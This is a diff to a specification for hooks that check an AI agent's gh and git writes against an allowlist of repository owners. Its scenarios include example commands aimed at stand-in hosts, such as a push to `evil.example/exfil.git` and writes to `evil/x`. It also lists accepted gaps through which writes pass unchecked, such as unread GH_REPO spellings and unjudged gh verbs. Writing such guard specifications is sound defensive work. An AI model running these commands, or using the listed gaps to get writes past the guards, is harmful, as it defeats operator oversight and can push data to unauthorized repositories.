@@ -74,7 +74,7 @@ The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNE
 - **THEN** the hook exits 2 naming `work-org/x`, because under `gh repo create` `--template` and `-p` take the template as their value and the argument is the new repository
 
 ### Requirement: What counts as a gh write
-`guard-gh-write` SHALL treat as writes: `gh pr|issue|release|label|repo|gist|workflow` with a mutating verb (`create`, `merge`, `close`, `comment`, `edit`, `delete`, `review`, `ready`, `reopen`, `lock`, `archive`, `rename`, `transfer`, `fork`, `run`, `enable`, `disable`), `gh secret|variable set|delete`, `gh release upload`, `gh label clone`, and `gh api` with a mutating `-X`/`--method`, a field flag or `--input`, unless an explicit `GET` method is given.
+`guard-gh-write` SHALL treat as writes: `gh pr|issue|release|label|repo|gist|workflow` with a mutating verb (`create`, `merge`, `close`, `comment`, `edit`, `delete`, `review`, `ready`, `reopen`, `lock`, `archive`, `rename`, `transfer`, `fork`, `run`, `enable`, `disable`), `gh secret|variable set|delete`, `gh release upload`, `gh label clone`, the deploy-key and autolink writes, and `gh api` with a mutating `-X`/`--method`, a field flag or `--input`, unless an explicit `GET` method is given.
 
 #### Scenario: API field write
 - **WHEN** the command is `gh api repos/evil/repo/issues -f title=x`
@@ -85,33 +85,74 @@ The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNE
 - **THEN** the hook allows
 
 ### Requirement: gh writes the guard cannot place
-`guard-gh-write` SHALL block a write it cannot place on an owned repository: no `-R` and no resolvable remote (`Cannot determine target repo for gh write operation`), an unparseable or ambiguous `-R`, an unexpanded variable target, a fork checkout with an unowned fork or upstream, a `gh api` write outside `repos/<owner>/<repo>` and an allowed owner's `orgs/<org>`, a GraphQL mutation, and a command too large or nested to read. Each reason SHALL name a concrete fix.
+`guard-gh-write` MUST allow a write whose target it cannot read exactly (cadence-ecosystem ADR-0046 rule 3): no readable `-R` or remote, `-R` readings that disagree, a target or host holding a shell expansion with no literal owner, a directory it cannot follow, a `gh api` write outside `repos/<owner>/<repo>/…` and `orgs/<org>/…`, and a command too large or nested to read. With no allowlist configured, a write MUST still block.
+
+#### Scenario: Substituted owner with a literal name
+- **WHEN** the command is `gh issue close 1 -R "$(cat o)/x"`
+- **THEN** the hook allows, because the substitution is an expansion in the owner
 
 #### Scenario: Write with no resolvable target
 - **WHEN** `gh issue create --title t` runs in a directory with no git remote
-- **THEN** the hook exits 2 and the reason tells the operator to add `-R <owner>/<repo>`
+- **THEN** the hook allows
+
+#### Scenario: Variable target
+- **WHEN** the command is `gh issue comment 1 -R "$REPO" --body-file c.md`
+- **THEN** the hook allows
+
+#### Scenario: Unexpanded host
+- **WHEN** the command is `GH_HOST=$GH_HOST gh pr edit 7 --repo cameronsjo/tool --body-file b.md`
+- **THEN** the hook allows
+
+#### Scenario: Literal owner with an expanded name
+- **WHEN** the command is `gh issue create -R "evil/$r" --title t`
+- **THEN** the hook exits 2 naming the owner `evil`
 
 #### Scenario: GraphQL read and thread resolution
 - **WHEN** the command is `gh api graphql -f query='query { viewer { login } }'` or a `resolveReviewThread` mutation
 - **THEN** the hook allows
 
+#### Scenario: GraphQL mutation
+- **WHEN** the command is `gh api graphql -f query='mutation { addComment(input: {subjectId: "S", body: "x"}) { clientMutationId } }'`
+- **THEN** the hook allows
+
+#### Scenario: Absolute API URL
+- **WHEN** the command is `gh api -X POST https://api.github.com/repos/evil/x/issues/1/comments -f body=hi`
+- **THEN** the hook exits 2 naming `evil/x`, as for the relative `repos/evil/x/…` path
+
+#### Scenario: Org-level API write
+- **WHEN** the command is `gh api -X POST orgs/evil/repos -f name=x`
+- **THEN** the hook exits 2 naming the owner `evil`
+
+#### Scenario: Placeholder owner
+- **WHEN** the command is `gh api -X POST repos/{owner}/{repo}/issues -f title=x` or `repos/:owner/:repo/issues` in a checkout of `cameronsjo/tool`
+- **THEN** the hook allows, because gh fills the placeholders from that checkout
+
+#### Scenario: Placeholder owner on a named host
+- **WHEN** the command is `gh api --hostname evil.example -X POST repos/{owner}/{repo}/issues -f title=x` in a checkout of `cameronsjo/tool`
+- **THEN** the hook exits 2, because gh sends it to `evil.example`, which the allowlist does not cover
+
+#### Scenario: Placeholder owner with a literal name
+- **WHEN** the command is `gh api -X POST 'repos/{owner}/other/issues' -f title=x` in a fork checkout with origin `work-org/x` and upstream `work-org/y`, `CADENCE_ALLOWED_OWNERS=cameronsjo` and `CADENCE_ALLOWED_REPOS=work-org/x,work-org/y`; or the same command as `GH_REPO=work-org/template gh api …` in a checkout of `cameronsjo/tool` with `CADENCE_ALLOWED_REPOS=work-org/template`
+- **THEN** the hook exits 2, because gh fills the owner from the base repository and keeps the literal name, so it writes to `work-org/other`, which neither allowlist covers
+
+#### Scenario: Placeholder org
+- **WHEN** the command is `GH_REPO=evil/x gh api -X POST 'orgs/{owner}/repos' -f name=x` (or with `GH_REPO` exported or inherited), or `gh api -X POST 'orgs/{owner}/repos' -f name=x` with no `GH_REPO` in a fork checkout whose upstream owner is `work-org`, with `CADENCE_ALLOWED_OWNERS=cameronsjo`
+- **THEN** the hook exits 2 naming the org gh fills in (`evil`, or `work-org`), and the same write allows when that owner is `cameronsjo` or the checkout is `cameronsjo/tool` with no `GH_REPO`
+
+#### Scenario: Upload and GHE.com URL prefixes
+- **WHEN** the command is `gh api -X POST "https://uploads.github.com/repos/evil/x/releases/1/assets?name=a" --input a`, or `https://api.acme.ghe.com/repos/evil/x/…` with `acme.ghe.com` in `CADENCE_EXTRA_HOSTS`
+- **THEN** the hook exits 2 naming `evil/x`
+
+#### Scenario: Look-alike API host
+- **WHEN** the command is `gh api -X POST https://api.github.com.evil.example/repos/evil/x/issues -f t=x`
+- **THEN** the hook allows, because the host is compared whole and names no repo this guard reads
+
 #### Scenario: Unconfigured machine
 - **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `gh pr merge 5 -R cameronsjo/tool`
 - **THEN** the hook exits 2 with `Not configured`
 
-### Requirement: gh writes allowed without an ownership check
-`guard-gh-write` SHALL allow `gh gist` writes and `gh repo fork` (they land under the operator's account) and `gh issue create --web`/`-w` unless the command sets `BROWSER=` or `GH_BROWSER=`. A loop of writes that name no target SHALL be allowed when its body never changes directory and the directory resolves to an owned non-fork repository; with `CADENCE_GH_STRICT_LOOPS=1` it MUST block, with the fix "Loop fix targets" names. An ownership probe past the git-probe deadline MUST allow.
-
-#### Scenario: Gist from an unowned checkout
-- **WHEN** `gh gist create notes.md` runs in a checkout whose remote is unowned
-- **THEN** the hook allows
-
-#### Scenario: Strict loops
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for n in 1 2; do gh issue close $n; done` in an owned checkout
-- **THEN** the hook exits 2 and the reason suggests the resolved `-R owner/repo`
-
 ### Requirement: Untargeted gh write context
-`inject-gh-write-context` (PreToolUse, Bash) SHALL nudge on every `gh` write segment that names no target (no `-R`, no `repos/owner/repo` path, no positional repo), restating that writes are allowlist-policed, that `-R owner/repo` should always be passed, and the allowed owners or that none are configured. It MUST repeat on every such write, MUST NOT block, and SHALL stay silent on reads and on writes that name their target.
+`inject-gh-write-context` (PreToolUse, Bash) SHALL nudge on every `gh` write segment that names no target (no `-R`, no `repos/owner/repo` or `orgs/<org>` path, no positional repo), restating that writes are allowlist-policed, that `-R owner/repo` should always be passed, and the allowed owners or that none are configured. It MUST repeat on every such write, MUST NOT block, and SHALL stay silent on reads and on writes that name their target.
 
 #### Scenario: Bare write
 - **WHEN** the command is `gh pr create --title t --body-file b.md`
@@ -248,77 +289,8 @@ A `tea` write judged on a login host MUST block when tea's config has a login th
 - **WHEN** the command is `CADENCE_GOING_PUBLIC_IGNORE=sonarr gh repo create sonarr-stack` and the session environment does not set it
 - **THEN** the hook still nudges
 
-### Requirement: gh writes in a loop the parser cannot read
-`guard-gh-write` MUST NOT block a loop the loop parser cannot read (past its 12 KB cap or time budget, or a syntax error) for that alone. It SHALL judge each gh write in the loop on its own, as outside a loop, and SHALL nudge on a judged write with no `-R`, `gh repo` positional `owner/repo`, `GH_REPO` or literal `repos/<owner>/<repo>/…` path, naming `-R owner/repo`. Under `CADENCE_GH_STRICT_LOOPS=1`, "Strict loops the parser cannot read" decides instead.
-
-#### Scenario: Unreadable loop with an unowned target
-- **WHEN** a comment takes `for i in 1 2; do gh issue close $i -R evil/x; done` past 12 KB
-- **THEN** the hook exits 2 because the write targets a repo the operator does not own
-
-#### Scenario: Unreadable loop with a directory it cannot follow
-- **WHEN** a comment takes `for d in a b; do cd "$d"; gh issue close 1; done` past 12 KB, in an owned checkout
-- **THEN** the hook exits 2 because the write's directory cannot be resolved
-
-#### Scenario: Unreadable loop of targeted writes or reads
-- **WHEN** a comment takes `for i in 1 2; do gh issue close $i -R cameronsjo/tool; done`, `for r in a b; do gh repo edit cameronsjo/tool --description $r; done` or `for i in 1 2; do gh pr view $i; done` past 12 KB
-- **THEN** the hook allows with no output
-
-#### Scenario: Unreadable loop with a write that names no target
-- **WHEN** a comment takes `for i in 1 2; do gh issue close $i; done` past 12 KB, in an owned checkout
-- **THEN** the hook exits 0 with a nudge to give every gh write in the loop `-R owner/repo`
-
-#### Scenario: Strict loops past the parse cap
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for n in 1 2; do gh issue close $n; done` past 12 KB, in an owned checkout
-- **THEN** the hook exits 2 and the reason tells the operator to give every gh write in the loop `-R owner/repo`
-
-#### Scenario: Strict loops past the parse cap with targets
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for n in 1 2; do gh issue close $n -R cameronsjo/tool; done` past 12 KB
-- **THEN** the hook allows
-
-### Requirement: gh writes in a loop the parser reads
-In a loop the loop parser reads, `guard-gh-write` MUST block a gh write that names no target when the loop body changes directory or the directory does not resolve to an owned non-fork repository. A write names its target with `-R`, or for `gh repo archive`, `delete`, `edit` and `create`, which take no `-R`, with a repository argument whose owner is spelled out. The reason SHALL name `-R` as the fix, or that argument for those verbs.
-
-#### Scenario: Loop that changes directory
-- **WHEN** the command is `for d in a b; do cd $d; gh issue close 1; done` in an owned checkout
-- **THEN** the hook exits 2 and the reason tells the operator to add `-R`
-
-#### Scenario: Loop in an unowned checkout
-- **WHEN** the command is `for n in 1 2; do gh issue close $n; done` in a checkout whose remote is unowned
-- **THEN** the hook exits 2
-
-#### Scenario: Loop of repo archives under an allowed owner
-- **WHEN** the command is `for r in a b; do gh repo archive "cameronsjo/$r" --yes; done` in a directory with no git remote
-- **THEN** the hook allows
-
-#### Scenario: Loop of repo archives that changes directory
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for d in a b; do cd "$d"; gh repo archive "cameronsjo/$d" --yes; done`
-- **THEN** the hook allows, because the argument names the target wherever the loop runs
-
-#### Scenario: Loop of repo archives under an unowned owner
-- **WHEN** the command is `for r in a b; do gh repo archive "evil/$r" --yes; done`, in any directory
-- **THEN** the hook exits 2, because the per-segment check judges the owner `evil`
-
-#### Scenario: Loop of repo archives with a variable owner
-- **WHEN** the command is `for r in a b; do gh repo archive "$o/$r" --yes; done` in a directory with no git remote
-- **THEN** the hook exits 2 and the reason names the repository argument (`gh repo archive owner/<repo>`), not `-R`
-
-#### Scenario: Loop of repo creates from an owned template
-- **WHEN** the command is `for r in a b; do gh repo create --template cameronsjo/tpl "work-org/$r" --private; done` in a directory with no git remote
-- **THEN** the hook exits 2, because the template is not the target and the new repository's owner `work-org` is not allowed
-
-### Requirement: Strict loops the parser cannot read
-With `CADENCE_GH_STRICT_LOOPS=1`, `guard-gh-write` MUST block a command the loop parser cannot read when it shows a `for … in` or `while …; do` loop and holds a write judged for ownership that has no `-R`, `gh repo` positional `owner/repo` or literal `repos/<owner>/<repo>/…` path; a `GH_REPO` does not count. A write allowed without an ownership check stays allowed.
-
-#### Scenario: Strict loops past the parse cap with a positional repo
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for r in a b; do gh repo edit cameronsjo/tool --description $r; done` past 12 KB
-- **THEN** the hook allows
-
-#### Scenario: Strict loops past the parse cap with a gist
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for i in 1 2; do gh gist create f$i.md; done` past 12 KB
-- **THEN** the hook allows
-
 ### Requirement: gh write named by a PR or issue URL argument
-On a `gh pr` or `gh issue` write verb that takes a `<number> | <url> | <branch>` argument, `guard-gh-write` SHALL judge the repo and host a PR or issue URL there names before `-R`, `GH_REPO` and the checkout; under `gh issue transfer` the URL is judged in addition to them. A loop check SHALL still read `-R`, or without one the checkout, first. A URL it cannot read for certain SHALL be judged as before. An unowned URL SHALL block with a fix that names no target. A flag's value SHALL NOT count.
+On a `gh pr` or `gh issue` write verb that takes a `<number> | <url> | <branch>` argument, `guard-gh-write` SHALL judge the repo and host a PR or issue URL there names before `-R`, `GH_REPO` and the checkout; under `gh issue transfer` the URL is judged in addition to them. A URL it cannot read for certain SHALL be judged as before. An unowned URL SHALL block with a fix that names no target. A flag's value SHALL NOT count.
 
 #### Scenario: Unowned PR URL past an owned target
 - **WHEN** the command is `gh pr merge https://github.com/evil/repo/pull/1 --squash -R cameronsjo/tool`, in a checkout of `cameronsjo/tool`
@@ -338,7 +310,7 @@ On a `gh pr` or `gh issue` write verb that takes a `<number> | <url> | <branch>`
 
 #### Scenario: Owned PR URL in a loop from an unowned checkout
 - **WHEN** the command is `for n in 1 2; do gh pr merge https://github.com/cameronsjo/tool/pull/$n; done`, in a checkout of `evil/repo`
-- **THEN** the hook exits 2
+- **THEN** the hook allows, judging each merge as a single command, where gh takes the URL's repo
 
 #### Scenario: Percent sign in the query
 - **WHEN** the command is `gh pr merge 'https://github.com/evil/repo/pull/1/files?file-filters%5B%5D=.rs'`, in a checkout of `cameronsjo/tool`
@@ -371,32 +343,109 @@ On a `gh pr` or `gh issue` write verb that takes a `<number> | <url> | <branch>`
 - **WHEN** the command is `eval 'echo hi'; git push origin feat` in an unowned checkout
 - **THEN** the hook exits 0 with no output
 
-### Requirement: Loop fix targets
-A `guard-gh-write` loop block SHALL name the directory's resolved repository in its fix only when gh sends every looped write there: the loop body stays in the directory, every gh write runs there when each segment is followed on its own, the command names no `GH_REPO`, `GH_HOST` or `GIT_DIR` and the hook's environment sets none, and each `gh api` write's path is `repos/{owner}/{repo}/…`. Every other fix SHALL hold a placeholder (`-R owner/repo`, `gh api repos/owner/repo/…`).
+### Requirement: User-scoped gh writes
+`guard-gh-write` SHALL allow `gh gist` writes and `gh repo fork` (they land under the operator's account) and `gh issue create --web`/`-w` unless the command sets `BROWSER=` or `GH_BROWSER=`. An ownership probe past the git-probe deadline MUST allow.
 
-#### Scenario: Strict loop that stays in the checkout
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for n in 1 2; do gh issue close $n; done` in a checkout of `cameronsjo/tool`
-- **THEN** the hook exits 2 and the reason names `-R cameronsjo/tool`
+#### Scenario: Gist from an unowned checkout
+- **WHEN** `gh gist create notes.md` runs in a checkout whose remote is unowned
+- **THEN** the hook allows
 
-#### Scenario: Loop that changes directory
-- **WHEN** the command is `for d in a b; do (cd "$d" && gh release delete v1 --yes); done` in a checkout of `cameronsjo/tool`, with or without `CADENCE_GH_STRICT_LOOPS=1`
-- **THEN** the hook exits 2 and the reason names `-R owner/repo`, not `cameronsjo/tool`
+### Requirement: gh writes in a loop
+`guard-gh-write` SHALL judge each gh write in a loop body as a single command, in the directory the guard reads it to run in. A literal unowned target SHALL block; a write without a target SHALL be judged on its directory's remotes; a target the shell builds per iteration (`-R "$r"`) MUST be allowed.
 
-#### Scenario: Strict loop of an api path that names its own owner
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for r in a b; do gh api -X DELETE "repos/work-org/$r/releases/1"; done` in a checkout of `cameronsjo/tool`
-- **THEN** the hook exits 2 and the reason names `gh api repos/owner/repo/…`, not `cameronsjo/tool`
+#### Scenario: Loop with a literal unowned target
+- **WHEN** the command is `for i in 1 2; do gh issue close $i -R evil/x; done`
+- **THEN** the hook exits 2 naming `evil/x`
 
-#### Scenario: Strict loop of an api path gh fills from the checkout
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for b in x y; do gh api -X DELETE "repos/{owner}/{repo}/git/refs/heads/$b"; done` in a checkout of `cameronsjo/tool`
-- **THEN** the hook exits 2 and the reason names `gh api repos/cameronsjo/tool/…`
+#### Scenario: Loop in an unowned checkout
+- **WHEN** the command is `for n in 1 2; do gh issue close $n; done` in a checkout whose remote is unowned
+- **THEN** the hook exits 2
 
-#### Scenario: Strict loop under a GH_REPO
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `export GH_REPO=work-org/x; for n in 3 4; do gh pr merge $n --squash; done` in a checkout of `cameronsjo/tool`
-- **THEN** the hook exits 2 and the reason names `-R owner/repo`, not `cameronsjo/tool`
+#### Scenario: Loop in an owned checkout
+- **WHEN** the command is `for n in 1 2; do gh issue close $n; done` in a checkout of `cameronsjo/tool`
+- **THEN** the hook allows
 
-#### Scenario: Strict loop after a cd in a subshell
-- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `(cd ../other && for n in 1 2; do gh pr merge $n; done)` in a checkout of `cameronsjo/tool`
-- **THEN** the hook exits 2 and the reason names `-R owner/repo`, not `cameronsjo/tool`
+#### Scenario: Loop over a variable target
+- **WHEN** the command is `for r in a b; do gh issue close 1 -R "$o/$r"; done`
+- **THEN** the hook allows
+
+### Requirement: Deploy-key and autolink writes
+`guard-gh-write` SHALL treat `gh repo deploy-key add|delete` and `gh repo autolink create|new|delete` as writes, judged on the same targets as every other `-R` write (`-R`, else a `GH_REPO` in force, else the checkout's remotes). Their `list` and `view` verbs SHALL be reads.
+
+#### Scenario: Deploy key on an unowned repo
+- **WHEN** the command is `gh repo deploy-key add key.pub -R evil/x`
+- **THEN** the hook exits 2 naming `evil/x`
+
+#### Scenario: Autolink through an exported GH_REPO
+- **WHEN** the command is `export GH_REPO=evil/x; gh repo autolink delete 1`, in a checkout of `cameronsjo/tool`
+- **THEN** the hook exits 2
+
+#### Scenario: Deploy key through an owned GH_REPO from an unowned checkout
+- **WHEN** the command is `GH_REPO=cameronsjo/tool gh repo deploy-key add key.pub`, in a checkout of `evil/up`
+- **THEN** the hook allows, because gh writes to `cameronsjo/tool` rather than the checkout
+
+### Requirement: GH_REPO a gh write inherits
+`guard-gh-write` SHALL read `GH_REPO` from an inline `GH_REPO=` on the gh word, and otherwise from the `GH_REPO` in force: the hook process's, replaced by each literal `export GH_REPO=` and cleared by each `unset GH_REPO` the command runs in its own shell before the write (bash's `unset -v` and `--` forms included). Any `GH_REPO` SHALL be judged only on a command gh reads it for: in the `gh repo` group only `rename`, `deploy-key` and `autolink`, and in `gh api` only to fill a placeholder.
+
+#### Scenario: Command that never reads GH_REPO
+- **WHEN** the command is `export GH_REPO=evil/x; gh repo create cameronsjo/new --private`
+- **THEN** the hook allows, because `gh repo create` takes its repository from its argument
+
+#### Scenario: Export in a child shell
+- **WHEN** the command is `bash -c 'export GH_REPO=evil/x'; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
+- **THEN** the hook allows
+
+#### Scenario: Exported GH_REPO
+- **WHEN** the command is `export GH_REPO=evil/x; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
+- **THEN** the hook exits 2 naming `evil/x`
+
+#### Scenario: Hook process GH_REPO
+- **WHEN** the hook process has `GH_REPO=evil/x` and `gh issue comment 1 --body hi` runs in a checkout of `cameronsjo/tool`
+- **THEN** the hook exits 2
+
+### Requirement: GH_REPO spellings the guard does not read
+`guard-gh-write` MUST NOT read a `GH_REPO` set any other way, as an accepted gap (cadence-ecosystem ADR-0046 rule 3): `GH_REPO=x; export GH_REPO`, `declare -x`, `typeset -x`, `readonly -x` (zsh), `export -p` (bash), `set -a`, and an `export` or `unset` inside a loop, `if`, brace group or other compound command. An `export` behind `&&` or `||` SHALL be read as if it ran.
+
+#### Scenario: Unset in a brace group
+- **WHEN** the command is `export GH_REPO=evil/x; { unset GH_REPO; }; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
+- **THEN** the hook exits 2, an accepted false block: the `unset` is not read, so the export stays in force
+
+#### Scenario: Assignment exported afterwards
+- **WHEN** the command is `GH_REPO=evil/x; export GH_REPO; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
+- **THEN** the hook allows
+
+#### Scenario: Conditional export
+- **WHEN** the command is `false && export GH_REPO=evil/x; gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
+- **THEN** the hook exits 2, reading the export as if it ran
+
+### Requirement: GH_HOST a gh write inherits
+`guard-gh-write` SHALL judge a write on the host it names (`--hostname`, an inline `GH_HOST=`), else the hook process's `GH_HOST`. A `GH_HOST` the command sets other than inline on the gh word (an `export`, a bare reassignment of an inherited one, an `unset`) MUST NOT be read.
+
+#### Scenario: Host the command exports
+- **WHEN** the command is `export GH_HOST=evil.example.com && gh pr create -R cameronsjo/x --title t`
+- **THEN** the hook allows, judging `cameronsjo/x` on the hook process's host
+
+### Requirement: Home directory in a gh write's cd
+`guard-gh-write` SHALL follow a `cd` or `pushd` to a leading `$HOME` or `${HOME}` that bash expands as it follows `cd ~/…`, unless the command may rebind `HOME`, and judge a write after it on that directory's remotes. An unquoted `$HOME` whose home path holds whitespace or a glob character MUST be left unread, as an accepted gap: that matches bash, which splits and globs it, and not zsh, which does neither and lands in the directory.
+
+#### Scenario: Unquoted HOME with a space
+- **WHEN** the home path holds a space, `~/up` is a checkout of `evil/up`, and the command is `cd $HOME/up; gh pr create --title t`, run from a checkout of `cameronsjo/tool`
+- **THEN** the hook allows
+
+#### Scenario: Home directory spelled with $HOME
+- **WHEN** `~/up` is a checkout of `evil/up` and the command is `cd "$HOME/up" && gh pr create --title t`
+- **THEN** the hook exits 2, as for `cd ~/up && gh pr create --title t`
+
+#### Scenario: HOME rebound first
+- **WHEN** the command is `HOME=/x; cd "$HOME/up" && gh pr create --title t`
+- **THEN** the hook allows, because it cannot follow the directory
+
+### Requirement: gh writes the guard does not judge
+`guard-gh-write` MUST allow, as an accepted gap, the gh writes outside its write set, whatever their target: `gh repo unarchive`, `gh repo sync`, `gh pr revert`, `gh pr update-branch`, `gh issue pin`, `unpin` and `develop`, `gh run rerun`, `cancel` and `delete`, `gh cache delete`, and `gh discussion create`, `edit` and `comment`.
+
+#### Scenario: Run rerun on an unowned repo
+- **WHEN** the command is `gh run rerun 1 -R evil/x`
+- **THEN** the hook allows
 
 ### Requirement: Pushes the push guard does not judge
 `guard-push-remote` SHALL allow with no output a push whose remote it did not read exactly (cadence-ecosystem ADR-0046 rule 3): a target or directory the shell builds at run time, a redirected or wrapped push, a `-c` override, a bare push after a possible branch switch, a URL with no `owner/repo`, or a remote git cannot resolve.
@@ -420,3 +469,59 @@ A `guard-gh-write` loop block SHALL name the directory's resolved repository in 
 #### Scenario: URL with no owner
 - **WHEN** the command is `git push https://evil.example/exfil.git main`
 - **THEN** the hook exits 0 with no output
+
+### Requirement: GH_REPO replaces the checkout
+On a command gh reads `GH_REPO` for, `guard-gh-write` SHALL drop the checkout as a target only for three exact shapes, the `GH_REPO` read exactly: an inline `GH_REPO=` prefix on the gh word; a whole command of one top-level `export GH_REPO=<literal>`, then `;` or a newline, then only plain gh invocations; or a whole command of only plain gh invocations under the hook process's value. Any other command MUST keep the checkout a target.
+
+#### Scenario: Rule 1, an inline prefix on gh
+- **WHEN** the command is `GH_REPO=cameronsjo/tool gh issue comment 1 --body hi`, `GH_REPO=cameronsjo/tool gh api -X POST repos/{owner}/{repo}/issues -f title=x`, or `cd . && GH_REPO=cameronsjo/tool gh pr merge 5 --squash`, in a checkout of `evil/up` or a fork whose upstream is `evil/up`
+- **THEN** the hook allows: every word before `gh` is an assignment, the last `GH_REPO=` there is a non-empty literal, and the command names `GH_HOST` nowhere else, so the rule holds whatever else the command holds
+
+#### Scenario: Rule 2, one export then only gh
+- **WHEN** the command is `export GH_REPO=cameronsjo/tool; gh issue comment 1 --body hi`, or the same with a newline for `;`, or with `&& gh pr merge 5 --squash` after it, in a checkout of `evil/up`
+- **THEN** the hook allows, because the whole command is that export joined by `;` or a newline to plain gh invocations joined by `;`, a newline, `&&` or `||`, with no substitution, backtick, subshell, group, function, keyword, process substitution or here-document anywhere, and no `GH_HOST` outside an inline prefix
+
+#### Scenario: Rule 3, only gh under the hook process's value
+- **WHEN** the hook process has `GH_REPO=cameronsjo/tool` and the command is `gh issue comment 1 --body hi` or `gh issue comment 1 --body hi; gh pr merge 5 --squash`, in a checkout of `evil/up`
+- **THEN** the hook allows, because the whole command is plain gh invocations, it never names `GH_REPO`, and it names `GH_HOST` nowhere outside an inline prefix
+
+#### Scenario: Any other shape keeps the checkout
+- **WHEN** the checkout is `evil/up` and, under an exported or hook-process `GH_REPO=cameronsjo/tool`, the command is `cd . && gh pr merge 5 --squash`, `gh issue comment 1 --body "$(cat body.md)"`, `export FOO=bar; gh …`, `export GH_REPO=cameronsjo/tool; GH_REPO=evil/up; gh …`, `export GH_REPO=cameronsjo/tool & gh …`, `[ -n "$X" ] && export GH_REPO=cameronsjo/tool; gh …`, `. ./x.sh; gh …`, `PR=$(source .env && gh pr create …)`, `case "$E" in prod) source .env;; esac; gh …`, `load_env() { source .env; }; load_env; gh …`, `env -u GH_REPO gh …`, `sudo gh …` or `export GH_HOST=ghe.example.com; gh …`
+- **THEN** the hook exits 2 on the checkout, as before this rule
+
+#### Scenario: Unowned GH_REPO from an owned checkout
+- **WHEN** the command is `GH_REPO=evil/x gh issue comment 1 --body hi` or `export GH_REPO=evil/x; gh issue comment 1 --body hi`, or the hook process has `GH_REPO=evil/x` and the command is `gh issue comment 1 --body hi`, in a checkout of `cameronsjo/tool`
+- **THEN** the hook exits 2 naming `evil/x`
+
+#### Scenario: Unreadable GH_REPO from an unowned checkout
+- **WHEN** the command is `GH_REPO="$R" gh issue comment 1 --body hi`, in a checkout of `evil/up`
+- **THEN** the hook exits 2 on the checkout, and the same command allows in a checkout of `cameronsjo/tool`
+
+#### Scenario: Command that never reads GH_REPO from an unowned checkout
+- **WHEN** the command is `GH_REPO=cameronsjo/tool gh repo edit --description d`, in a checkout of `evil/up`
+- **THEN** the hook exits 2, because `gh repo edit` writes to the checkout's repository
+
+### Requirement: The hook process's GH_REPO is the command shell's
+For rule 3, `guard-gh-write` SHALL assume, as an accepted assumption, that the `GH_REPO` in the hook process's environment is the one the command's shell hands gh, though a shell profile or session environment file could export a different one.
+
+#### Scenario: Hook process value under rule 3
+- **WHEN** the hook process has `GH_REPO=cameronsjo/tool` and the command is `gh pr merge 5 --squash`, in a checkout of `evil/up`
+- **THEN** the hook allows on that value, without reading any profile or session environment file
+
+### Requirement: Writes past their repository keep the checkout
+`guard-gh-write` MUST NOT let a `GH_REPO` replace the checkout on `gh secret` or `gh variable` `set` or `delete` with `--org` (`-o`), or on `gh issue transfer`, whose real target (the org, the destination repo) it does not read.
+
+#### Scenario: Org secret under an owned GH_REPO
+- **WHEN** the command is `GH_REPO=cameronsjo/tool gh secret set TOKEN --org evil --body x`, `GH_REPO=cameronsjo/tool gh secret delete TOKEN --org evil` or `GH_REPO=cameronsjo/tool gh issue transfer 1 evil/up`, in a checkout of `evil/up`
+- **THEN** the hook exits 2 on the checkout
+
+### Requirement: A GH_REPO-filled placeholder is judged on the host gh sends it to
+When `guard-gh-write` fills a `gh api` `repos/{owner}/…` placeholder from `GH_REPO`, it SHALL judge the filled repository on the endpoint URL's host, else the command's (`--hostname`, else `GH_HOST`, else the default host), and MUST NOT use a host the value names, with or without an exact shape: gh 2.104.0's `fillPlaceholders` (`pkg/cmd/api/api.go`) takes only `RepoOwner()` and `RepoName()`.
+
+#### Scenario: Host-qualified GH_REPO with a relative placeholder endpoint
+- **WHEN** `CADENCE_ALLOWED_OWNERS=github.com/cameronsjo`, `CADENCE_EXTRA_HOSTS=ghe.work.com`, and the command is `GH_REPO=ghe.work.com/cameronsjo/tool gh api -X POST repos/{owner}/{repo}/issues -f title=x`, in a checkout of `cameronsjo/tool` or `evil/up`
+- **THEN** the hook allows, because gh writes to `cameronsjo/tool` on github.com; before this rule the value's own host was judged and the write blocked
+
+#### Scenario: Placeholder sent to another host
+- **WHEN** the same allowlists hold and the command is `GH_REPO=cameronsjo/tool gh api -X POST https://ghe.work.com/api/v3/repos/{owner}/{repo}/issues -f title=x`, or `GH_REPO=github.com/cameronsjo/tool gh api --hostname ghe.work.com -X POST repos/{owner}/{repo}/issues -f title=x`
+- **THEN** the hook exits 2, because gh writes to `cameronsjo/tool` on `ghe.work.com`, which the allowlist does not cover
